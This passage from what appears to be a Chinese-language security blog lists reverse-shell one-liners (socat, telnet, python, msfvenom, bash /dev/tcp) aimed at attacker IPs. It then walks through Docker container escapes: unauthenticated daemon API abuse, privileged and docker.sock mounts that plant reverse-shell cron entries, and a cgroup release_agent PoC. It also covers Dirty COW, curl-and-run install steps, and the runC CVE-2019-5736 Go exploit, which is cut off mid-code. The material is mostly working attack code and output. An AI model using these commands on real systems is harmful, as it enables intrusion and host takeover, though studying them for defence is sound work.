<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="variable constant_">TCP</span>-<span class="attr">LISTEN</span>:<span class="number">2333</span> -或nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
<p>目标机主动连接攻击机 **：**</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-<span class="attr">connect</span>:<span class="number">47.</span>xxx.<span class="property">xxx</span><span class="number">.72</span>:<span class="number">2333</span> <span class="attr">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
<p><strong>7. 利用 Telnet 反弹 shell</strong></p>
<p>攻击机开启本地监听：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
<p>目标机主动连接攻击机 **：**</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet <span class="number">47.</span>xxx.<span class="property">xxx</span><span class="number">.72</span> <span class="number">2333</span> <span class="number">0</span>&lt;a | <span class="regexp">/bin/</span>bash <span class="number">1</span>&gt;a</span><br></pre></td></tr></table></figure>
<p>或者</p>
<p>攻击机需要开启两个本地监听 **：**</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333nc -lvvp <span class="number">4000</span></span><br></pre></td></tr></table></figure>
<p>目标机主动连接攻击机：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span> <span class="number">2333</span> | <span class="regexp">/bin/</span>bash | telnet <span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span> <span class="number">4000</span></span><br></pre></td></tr></table></figure>
<p>8.<strong>python 反弹 shell</strong></p>
<p>攻击机开启本地监听：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
<p>目标机主动连接攻击机：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>9. 使用 msf</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODE4MDkx">反弹 Shell，看这一篇就够了 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>
<p>顺便再提一句</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201190805082.png" alt="image-20221201190805082"></p>
<p>在 bash 中是如下描述的：</p>
<blockquote>
<p><strong>Bash</strong> handles several filenames specially when they are used in redirections, as described in the following table:</p>
<p><code>/dev/tcp/host/port</code></p>
<p>If <em>host</em> is a valid hostname or Internet address, and <em>port</em> is an integer port number or service name, <strong>bash</strong> attempts to open a TCP connection to the corresponding socket.</p>
<p><code>/dev/udp/host/port</code></p>
<p>If <em>host</em> is a valid hostname or Internet address, and <em>port</em> is an integer port number or service name, <strong>bash</strong> attempts to open a UDP connection to the corresponding socket.</p>
<p>一些文件名在重定向中被 bash 特殊处理</p>
<p>如果主机是有效的主机名或 Internet 地址，端口是整数端口号或服务名称，bash 将尝试打开到相应套接字的 TCP/UDP 连接。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi8xL2Jhc2g=">bash(1): GNU Bourne-Again SHell - Linux man page (die.net)</span></p>
<p>这其实是一种 redirection。这意味着即使要创建一个内核 <code>/dev/tcp</code>  工具，shell 也会在 99％的时间内以交互方式屏蔽它。</p>
</blockquote>
<p>bash 源码中对 /dev/tcp/ 的处理，截取出 ip、端口，建立 tcp 连接。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201191252436.png" alt="image-20221201191252436"></p>
<p><code>/dev/&#123;tcp|udp&#125;/$&#123;host&#125;/$&#123;port&#125;</code>  这个功能只在 bash 中存在，其它的 shell 如 sh、dash、zsh 中是没有的。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lyndon_li/article/details/121447208">(71 条消息) /dev/tcp/<em>/</em>_Li-Yongjun 的博客 - CSDN 博客_dev/tcp</a></p>
<h2 id="docker-逃逸"><a class="markdownIt-Anchor" href="#docker-逃逸">#</a> docker 逃逸</h2>
<p>因为 Docker 所使用的是隔离技术，就导致了容器内的进程无法看到外面的进程，但外面的进程可以看到里面，所以如果一个容器可以访问到外面的资源，甚至是获得了宿主主机的权限，这就叫做 “Docker 逃逸”。</p>
<h3 id="1docker-daemon-api未授权访问"><a class="markdownIt-Anchor" href="#1docker-daemon-api未授权访问">#</a> 1.docker daemon api 未授权访问</h3>
<p>docker swarm 是管理 docker 集群的工具。主从管理、默认通过 2375 端口通信。绑定了一个 Docker Remote API 的服务，可以通过 HTTP、Python、调用 API 来操作 Docker。</p>
<p>在使用 docker swarm 的时候，节点上会开放一个 TCP 端口 2375，绑定在 0.0.0.0 上，如果我们使用 HTTP 的方式访问会返回 404</p>
<p>使用如下方式启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>
<p>在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。</p>
<p>1. 首先列出所有容器，得到 id 字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:2375/containers/json</span><br></pre></td></tr></table></figure>
<p>2. 创建 exec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /containers/&lt;container_id&gt;/exec HTTP/1.1</span><br><span class="line">Host: &lt;docker_host&gt;:PORT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 188</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;AttachStdin&quot;: true,</span><br><span class="line">  &quot;AttachStdout&quot;: true,</span><br><span class="line">  &quot;AttachStderr&quot;: true,</span><br><span class="line">  &quot;Cmd&quot;: [&quot;cat&quot;, &quot;/etc/passwd&quot;],</span><br><span class="line">  &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,</span><br><span class="line">  &quot;Privileged&quot;: true,</span><br><span class="line">  &quot;Tty&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 burp 模拟 post 请求发包，得到返回的 id 参数。</p>
<p>3、启动 exec, 成功执行了系统命令，读取到了 passwd 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /exec/&lt;exec_id&gt;/start HTTP/1.1</span><br><span class="line">Host: &lt;docker_host&gt;:PORT</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;Detach&quot;: false,</span><br><span class="line"> &quot;Tty&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果要逃逸到宿主机，利用方法是，我们随意启动一个容器，并将宿主机的 <code>/etc</code>  目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://your-ip:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2docker-特权逃逸"><a class="markdownIt-Anchor" href="#2docker-特权逃逸">#</a> 2.docker 特权逃逸</h3>
<p>1. 启动特权容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged ubuntu:18.04  </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@f445bbcea9dd:/# id </span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
<p>2. 挂载宿主目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@f445bbcea9dd:/# fdisk -l</span><br><span class="line">Disk /dev/vda: 50 GiB, 53687091200 bytes, 104857600 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x0009ac89</span><br><span class="line"></span><br><span class="line">Device     Boot Start       End   Sectors Size Id Type</span><br><span class="line">/dev/vda1  *     2048 104857566 104855519  50G 83 Linux</span><br><span class="line">root@f445bbcea9dd:/# mkdir /uzju</span><br><span class="line">root@f445bbcea9dd:/# mount /dev/vda1 /uzju/</span><br><span class="line">root@f445bbcea9dd:/# chroot /uzju/</span><br><span class="line">sh-4.2# ls </span><br><span class="line">1.sh	  CronText    c-jwt-cracker  clash	    docker-file  haha.py	msfinstall  vendor</span><br><span class="line">Arjun	  DS_Store    check.py	     composer.json  etcbackup	 install.sh	plus.c</span><br><span class="line">sh-4.2# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">guest:x:0:0:guest:/home/guest:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br></pre></td></tr></table></figure>
<h3 id="3挂载dockersock"><a class="markdownIt-Anchor" href="#3挂载dockersock">#</a> 3. 挂载 docker.sock</h3>
<p>/var/run/docker.sock 是 Docker 守护程序默认监听的 Unix 套接字。它也是一个用于从容器内与 Docker 守护进程通信的工具 Unix Sockets 术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。</p>
<p>另一种类型的 Socket 是 Unix Socket，这些套接字用于 IPC（进程间通信）。它们也称为 Unix 域套接字 (UDS)。Unix 套接字使用本地文件系统进行通信，而 IP 套接字使用网络。</p>
<p>Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd. 默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、unix:///var/run/docker.sock</span><br><span class="line">2、tcp://host:port</span><br><span class="line">3、fd://socketfd</span><br></pre></td></tr></table></figure>
<p>其中使用 docker.sock 进行通信为默认方式，当容器中进程需在生产过程中与 Docker 守护进程通信时，容器本身需要挂载 /var/run/docker.sock 文件。<br>
本质上而言，能够访问 docker socket 或连接 HTTPS API 的进程可以执行 Docker 服务能够运行的任意命令，以 root 权限运行的 Docker 服务通常可以访问整个主机系统。<br>
因此，当容器访问 docker socket 时，我们可通过与 docker daemon 的通信对其进行恶意操纵完成逃逸。若容器 A 可以访问 docker socket，我们便可在其内部安装 client（docker），通过 docker.sock 与宿主机的 server（docker daemon）进行交互，运行并切换至不安全的容器 B，最终在容器 B 中控制宿主机。</p>
<p>创建 docker, 挂载 /var/run/ 的容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04  </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@381fa7cedc40:/var/run# ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 1 root root 4096 Nov 28 02:08 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Nov 28 02:17 ..</span><br><span class="line">srw-rw---- 1 root  992    0 Apr 17  2022 docker.sock</span><br><span class="line">drwxrwxrwt 2 root root 4096 Sep 30  2021 lock</span><br><span class="line">drwxr-xr-x 2 root root 4096 Sep 30  2021 mount</span><br><span class="line">drwxr-xr-x 2 root root 4096 Sep 30  2021 systemd</span><br><span class="line">-rw-rw-r-- 1 root utmp    0 Sep 30  2021 utmp</span><br></pre></td></tr></table></figure>
<p>查看宿主机 docker 信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock info</span><br></pre></td></tr></table></figure>
<p>运行一个新容器并挂载宿主机根路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:18.04 /bin/bash </span><br><span class="line">chroot /aa</span><br></pre></td></tr></table></figure>
<p>在新容器 /aa 路径下完成对宿主机资源的访问</p>
<p>写入计划任务文件，反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9988 0&gt;&amp;1&#x27; &gt;&gt; /nuoyan/var/spool/cron/root </span><br></pre></td></tr></table></figure>
<h3 id="4挂载宿主机根目录"><a class="markdownIt-Anchor" href="#4挂载宿主机根目录">#</a> 4. 挂载宿主机根目录</h3>
<p>如果在 docker 启动的时候挂载了宿主机的根目录，就可以通过 chroot 获取宿主机的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/uzju/ ubuntu:18.04 </span><br><span class="line">chroot /uzju/  </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2# ls </span><br><span class="line">1.sh	  CronText    c-jwt-cracker  clash	    docker-file  haha.py	msfinstall  vendor</span><br><span class="line">Arjun	  DS_Store    check.py	     composer.json  etcbackup	 install.sh	plus.c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.139/ &gt;&amp;  </span><br></pre></td></tr></table></figure>
<h3 id="5-cgroup执行宿主机系统命令"><a class="markdownIt-Anchor" href="#5-cgroup执行宿主机系统命令">#</a> 5、Cgroup 执行宿主机系统命令</h3>
<p>通过 notify_on_release 实现容器逃逸条件</p>
<ul>
<li>以 root 用户身份在容器内运行</li>
<li>使用 SYS_ADMINLinux 功能运行</li>
<li>缺少 AppArmor 配置文件，否则将允许 mountsyscall</li>
<li>cgroup v1 虚拟文件系统必须以读写方式安装在容器内</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04  </span><br></pre></td></tr></table></figure>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># In the container </span><br><span class="line"># 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x </span><br><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x </span><br><span class="line"># 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent </span><br><span class="line">#  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent </span><br><span class="line">echo 1 &gt; /tmp/cgrp/x/notify_on_release </span><br><span class="line">host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab` </span><br><span class="line">echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent </span><br><span class="line"># 写入自定义命令 </span><br><span class="line">echo &#x27;#!/bin/sh&#x27; &gt; /cmd </span><br><span class="line"># 结果在当前目录的output文件中 </span><br><span class="line">echo &quot;ls -al /root &gt; $host_path/output&quot; &gt;&gt; /cmd </span><br><span class="line">chmod a+x /cmd </span><br><span class="line"># 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果 </span><br><span class="line">sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot; </span><br></pre></td></tr></table></figure>
<p>cat output</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@6c9a389c4fa2:/# cat output </span><br><span class="line">total 44688</span><br><span class="line">dr-xr-x---. 24 root       root           4096 Nov 27 11:01 .</span><br><span class="line">dr-xr-xr-x. 24 root       root           4096 Nov 28 10:44 ..</span><br><span class="line">-rwxrwxrwx   1 root       root           1460 Apr  4  2022 1.sh</span><br><span class="line">drwxr-xr-x   3 root       root           4096 May 16  2022 Arjun</span><br><span class="line">drwxr-xr-x   5 root       root           4096 Oct 31 14:19 CS4.4</span><br><span class="line">-rw-r--r--   1 root       root         320279 Nov 27 11:00 Cron.txt</span><br><span class="line">-rw-r--r--   1 root       root       44937808 Nov 28 10:40 CronText</span><br><span class="line">-rw-r--r--   1 root       root           8196 May 29  2022 DS_Store</span><br><span class="line">-rw-r--r--   1 root       root            284 Sep  4 12:27 Dockerfile</span><br><span class="line">drwxr-xr-x   3 root       root           4096 Sep  4 22:50 book</span><br><span class="line">drwxr-xr-x   3 root       root           4096 May  6  2022 c-jwt-cracker</span><br><span class="line">-rw-r--r--   1 root       root          18856 Dec 28  2021 check.py</span><br><span class="line">-rw-r--r--   1 root       root          16999 Dec 28  2021 check1.py</span><br></pre></td></tr></table></figure>
<p>剩下还有一堆我复现不了的逃逸方法，仅在此做记录，不代表具有真实可行性</p>
<h3 id="6dirty-cow-漏洞逃逸"><a class="markdownIt-Anchor" href="#6dirty-cow-漏洞逃逸">#</a> 6.Dirty Cow 漏洞逃逸</h3>
<p>Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，源于 Linux 内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>
<p>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得 root 权限。VDSO 就是 Virtual Dynamic Shared Object（虚拟动态共享对象），<span class="exturl" data-url="aHR0cDovL3huLS12c3E4OWJsNGJqNTJhbjhhbXpvYzQxYXc5MWEuc28=">即内核提供的虚拟.so</span>。该.so 文件位于内核而非磁盘，程序启动时，内核把包含某.so 的内存页映射入其内存空间，对应程序就可作为普通.so 使用其中的函数。</p>
<p>在容器中利用 VDSO 内存空间中的 “clock_gettime () ” 函数可对脏牛漏洞发起攻击，令系统崩溃并获得 root 权限的 shell，且浏览容器之外主机上的文件。</p>
<p>centos 下自动安装 docker 环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh  </span><br></pre></td></tr></table></figure>
<p>1. 运行漏洞 exp</p>
<p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmdpdGh1Yi5jb20lMkZzY3VtanIlMkZkaXJ0eWNvdy12ZHNv">https://github.com/scumjr/dirtycow-vdso</span></p>
<p>2. 编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /dirtycow-vdso/    //进入dirtycow-vdso文件夹</span><br><span class="line">make       //使用make命令编译.c文件</span><br><span class="line">./0xdeadbeef     //运行0xdeadbeef 文件</span><br></pre></td></tr></table></figure>
<p>显示 successfully 表示成功。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1594194364.png!small" alt="img"></p>
<p>成功获取到宿主机的 shell。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1594194403.png!small" alt="img"></p>
<h3 id="7runc逃逸-cve-2019-5736"><a class="markdownIt-Anchor" href="#7runc逃逸-cve-2019-5736">#</a> 7.runC 逃逸 - CVE-2019-5736</h3>
<p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="attr">https</span>:<span class="comment">//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o i</span></span><br></pre></td></tr></table></figure>
<p>Docker、containerd 或者其他基于 runc 的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者 exec 操作获取到宿主机 runc 执行时的文件句柄并修改掉 runc 的二进制文件，从而获取到宿主机的 root 执行权限。</p>
<ol>
<li></li>
</ol>
<p>首先编译 go 脚本，生成攻击 payload<span class="exturl" data-url="aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmdpdGh1Yi5jb20lMkZGcmljaGV0dGVuJTJGQ1ZFLTIwMTktNTczNi1Qb0M=">https://github.com/Frichetten/CVE-2019-5736-PoC</span></p>
<p>修改脚本中的反弹地址为自己 vps 地址。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellCmd <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;shellCmd, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Execute arbitrary commands&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line">	<span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n&quot;</span> + shellCmd</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	